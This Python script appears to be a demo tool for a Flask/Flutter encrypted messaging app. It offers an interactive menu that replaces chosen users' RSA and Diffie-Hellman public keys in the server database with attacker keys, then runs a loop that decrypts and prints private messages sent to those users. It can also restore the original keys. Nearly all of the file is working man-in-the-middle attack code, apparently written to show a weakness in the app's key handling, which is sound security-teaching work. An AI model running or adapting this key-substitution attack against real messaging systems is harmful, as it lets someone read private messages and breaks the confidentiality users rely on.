import sys
import os
import base64
import json
import time
import threading
import hashlib
import logging
from datetime import datetime, timezone

# Add server directory to python path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from server import create_app, db
from server.models import User, PrivateMessage, GroupMessageCopy
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# RFC 3526 Group 14 (MODP 2048-bit)
DH_P = int(
    'FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74'
    '020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F1437'
    '4FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED'
    'EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF05'
    '98DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB'
    '9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B'
    'E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF695581718'
    '3995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF',
    16
)
DH_G = 2

class CryptoReplica:
    """
    Replicates the specific cryptography implementations from the Flutter app.
    Including the 'Textbook RSA' implementation from rsa.dart.
    """
    
    @staticmethod
    def generate_rsa_keypair(bits=2048):
        """Generates RSA keypair (returning standard python objects)"""
        p = 0
        q = 0
        import random
        from sympy import nextprime # Ideally use a library but for demo we might need simple generation
        # Since we just need A key pair, we can use cryptography library but we need raw integers for the custom logic across the wire
        # However, the app sends PEM.
        # Let's use `cryptography` to generate, then extract numbers.
        
        from cryptography.hazmat.primitives.asymmetric import rsa
        
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=bits
        )
        return private_key

    @staticmethod
    def rsa_private_key_to_pem(private_key):
        from cryptography.hazmat.primitives import serialization
        return private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS1,
            encryption_algorithm=serialization.NoEncryption()
        ).decode('utf-8')

    @staticmethod
    def rsa_public_key_to_pem(public_key):
        from cryptography.hazmat.primitives import serialization
        return public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.PKCS1
        ).decode('utf-8')
        
    @staticmethod
    def generate_dh_keypair():
        """Generates DH keypair as BigInts"""
        # x between 2 and p-2
        import secrets
        # Generate 2048 bit random number
        private_key = secrets.randbelow(DH_P - 2) + 2
        public_key = pow(DH_G, private_key, DH_P)
        return private_key, public_key

    @staticmethod
    def compute_shared_secret(private_key, other_public_key):
        # s = (y_other ^ x_self) mod p
        shared_secret = pow(other_public_key, private_key, DH_P)
        
        # Derive 256-bit key using SHA-256 of the bytes of the shared secret
        # Note: Dart's _bigIntToBytes handles padding?
        # Dart: 
        # var hex = number.toRadixString(16);
        # if (hex.length % 2 != 0) hex = '0$hex';
        # Then hex decode.
        
        hex_val = hex(shared_secret)[2:] # remove 0x
        if len(hex_val) % 2 != 0:
            hex_val = '0' + hex_val
        
        secret_bytes = bytes.fromhex(hex_val)
        return hashlib.sha256(secret_bytes).digest()

    @staticmethod
    def aes_decrypt(ciphertext_b64, nonce_b64, auth_tag_b64, key):
        """Decrypts AES-GCM 256"""
        ciphertext = base64.b64decode(ciphertext_b64)
        nonce = base64.b64decode(nonce_b64)
        auth_tag = base64.b64decode(auth_tag_b64)
        
        aesgcm = AESGCM(key)
        # AESGCM in cryptography expects tag appended to ciphertext for decrypt? No, it's separate in some libs.
        # cryptography.hazmat: "The tag must be passed in separately." -> actually No.
        # "decrypt(nonce, data, associated_data)" where data is ciphertext + tag.
        
        try:
            return aesgcm.decrypt(nonce, ciphertext + auth_tag, None).decode('utf-8')
        except Exception as e:
            return f"[Decryption Failed: {e}]"

    # Custom RSA logic from rsa.dart
    @staticmethod
    def custom_rsa_sign(message, rsa_private_key_obj):
        """
        Replicates:
        final mInt = BigInt.parse(hex.encode(utf8.encode(m)), radix: 16);
        final hInt = h(mInt);
        final sign = hInt.modPow(kPrivee.exponent!, kPrivee.modulus!);
        
        h(n) = BigInt(SHA256(bytes(n)))
        """
        # message to integers
        m_bytes = message.encode('utf-8')
        
        # h(mInt) -> This basically starts from bytes again
        # The Dart code converts bytes->hex->BigInt->hex->bytes. 
        # Effectively it hashes the utf-8 bytes of the message.
        
        msg_hash = hashlib.sha256(m_bytes).digest()
        h_int = int.from_bytes(msg_hash, byteorder='big')
        
        # RSA Sign: s = m^d mod n
        pn = rsa_private_key_obj.private_numbers()
        d = pn.d
        n = pn.public_numbers.n
        
        signature_int = pow(h_int, d, n)
        
        # Convert to bytes then base64
        # Dart _bigIntToBytes logic
        hex_sig = hex(signature_int)[2:]
        if len(hex_sig) % 2 != 0:
            hex_sig = '0' + hex_sig
        sig_bytes = bytes.fromhex(hex_sig)
        
        return base64.b64encode(sig_bytes).decode('utf-8')

    @staticmethod
    def big_int_from_b64(b64_str):
        b = base64.b64decode(b64_str)
        return int.from_bytes(b, byteorder='big')

    @staticmethod
    def big_int_to_b64(val):
        hex_val = hex(val)[2:]
        if len(hex_val) % 2 != 0:
            hex_val = '0' + hex_val
        b = bytes.fromhex(hex_val)
        return base64.b64encode(b).decode('utf-8')


class AttackTool:
    def __init__(self, app):
        self.app = app
        self.original_keys = {} # {username: {'rsa': ..., 'dh': ...}}
        self.fake_keys = {}     # {username: {'rsa': priv, 'dh': priv}} (Private keys kept here)
        self.active_targets = set()

    def list_users(self):
        with self.app.app_context():
            users = User.query.all()
            print("\n--- Available Users ---")
            for u in users:
                print(f"ID: {u.id} | Username: {u.username} ({u.unique_username})")
            print("-----------------------")
            return users

    def compromise_user(self, unique_username):
        with self.app.app_context():
            user = User.query.filter_by(unique_username=unique_username).first()
            if not user:
                print(f"User {unique_username} not found.")
                return

            if unique_username in self.original_keys:
                print(f"User {unique_username} already compromised.")
                return

            print(f"[*] Compromising {unique_username}...")
            
            # Backup original keys
            self.original_keys[unique_username] = {
                'rsa': user.rsa_public_key,
                'dh': user.dh_public_key
            }
            
            # Generate fake keys
            print("    Generating fake RSA keypair...")
            fake_rsa_priv = CryptoReplica.generate_rsa_keypair()
            fake_rsa_pub_pem = CryptoReplica.rsa_public_key_to_pem(fake_rsa_priv.public_key())
            
            print("    Generating fake DH keypair...")
            fake_dh_priv, fake_dh_pub = CryptoReplica.generate_dh_keypair()
            fake_dh_pub_b64 = CryptoReplica.big_int_to_b64(fake_dh_pub)
            
            # Store fake private keys for decryption later
            self.fake_keys[unique_username] = {
                'rsa_priv': fake_rsa_priv,
                'dh_priv': fake_dh_priv
            }
            
            # Update DB
            user.rsa_public_key = fake_rsa_pub_pem
            user.dh_public_key = fake_dh_pub_b64
            db.session.commit()
            
            self.active_targets.add(unique_username)
            print(f"[+] User {unique_username} compromised! keys replaced in DB.")

    def restore_user(self, unique_username):
        with self.app.app_context():
            if unique_username not in self.original_keys:
                print(f"No backup for {unique_username}.")
                return
            
            user = User.query.filter_by(unique_username=unique_username).first()
            if user:
                keys = self.original_keys[unique_username]
                user.rsa_public_key = keys['rsa']
                user.dh_public_key = keys['dh']
                db.session.commit()
                print(f"[+] User {unique_username} restored to original keys.")
                
            del self.original_keys[unique_username]
            del self.fake_keys[unique_username]
            if unique_username in self.active_targets:
                self.active_targets.remove(unique_username)

    def restore_all(self):
        print("[*] Restoring all users...")
        for username in list(self.original_keys.keys()):
            self.restore_user(username)

    def spy_loop(self):
        print(f"[*] Spy monitor started. Watching for messages to {self.active_targets}...")
        last_check = datetime.now(timezone.utc)
        
        while True:
            try:
                if not self.active_targets:
                    time.sleep(1)
                    continue

                with self.app.app_context():
                    # Find messages sent to our compromised users
                    # We need to look for messages created after last_check
                    
                    # Note: In a real attack we might want to intercept, store, re-encrypt and forward.
                    # For this demo, we just decrypt to show we can read it. 
                    # The victim (receiver) will likely fail to decrypt because they don't have the fake private key 
                    # corresponding to the fake public key the sender used. 
                    # This Denial of Service side-effect is sufficient to prove the keys were swapped.
                    
                    targets = list(self.active_targets)
                    target_users = User.query.filter(User.unique_username.in_(targets)).all()
                    target_ids = [u.id for u in target_users]
                    
                    messages = PrivateMessage.query.filter(
                        PrivateMessage.receiver_id.in_(target_ids),
                        PrivateMessage.created_at > last_check
                    ).all()
                    
                    if messages:
                        last_check = datetime.now(timezone.utc)
                    
                    for msg in messages:
                        receiver = next((u for u in target_users if u.id == msg.receiver_id), None)
                        if not receiver: continue
                        
                        sender = User.query.get(msg.sender_id)
                        
                        print(f"\n[INTERCEPTED] Message from {sender.unique_username} to {receiver.unique_username}")
                        
                        # Decrypt
                        # 1. We need the sender's public key (Real one, from DB)
                        # The sender used OUR FAKE Public Key to generate shared secret.
                        # Shared Secret = (MyFakePrivKey)^SenderPubKey mod P ? 
                        # Wait. DH:
                        # Sender Computes: S = (ReceiverFakePub)^SenderPriv mod P
                        # Sender Sent: SenderPub
                        # We (Attacker) have: ReceiverFakePriv
                        # We Compute: S = (SenderPub)^ReceiverFakePriv mod P
                        # This S should match what sender computed.
                        
                        sender_dh_pub = CryptoReplica.big_int_from_b64(sender.dh_public_key)
                        my_fake_dh_priv = self.fake_keys[receiver.unique_username]['dh_priv']
                        
                        shared_secret = CryptoReplica.compute_shared_secret(my_fake_dh_priv, sender_dh_pub)
                        
                        plaintext = CryptoReplica.aes_decrypt(
                            msg.ciphertext, 
                            msg.nonce, 
                            msg.auth_tag, 
                            shared_secret
                        )
                        
                        print(f"   > DECRYPTED CONTENT: \"{plaintext}\"")
                        print(f"   > Shared Secret (Hex): {shared_secret.hex()}")
                
                time.sleep(1)
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Error in spy loop: {e}")
                time.sleep(1)

def interactive_menu():
    app = create_app('development') # Use dev config
    tool = AttackTool(app)
    
    spy_thread = threading.Thread(target=tool.spy_loop, daemon=True)
    spy_thread.start()
    
    while True:
        print("\n=== MITM ATTACK DEMO ===")
        print("1. List Users")
        print("2. Compromise a User (Swap Keys)")
        print("3. Restore a User")
        print("4. Restore All & Exit")
        
        choice = input("Select option: ")
        
        if choice == '1':
            tool.list_users()
        elif choice == '2':
            u = input("Enter unique_username to compromise: ")
            tool.compromise_user(u)
        elif choice == '3':
            u = input("Enter unique_username to restore: ")
            tool.restore_user(u)
        elif choice == '4':
            tool.restore_all()
            print("Exiting...")
            sys.exit(0)

if __name__ == '__main__':
    try:
        interactive_menu()
    except KeyboardInterrupt:
        print("\nForce exiting...")
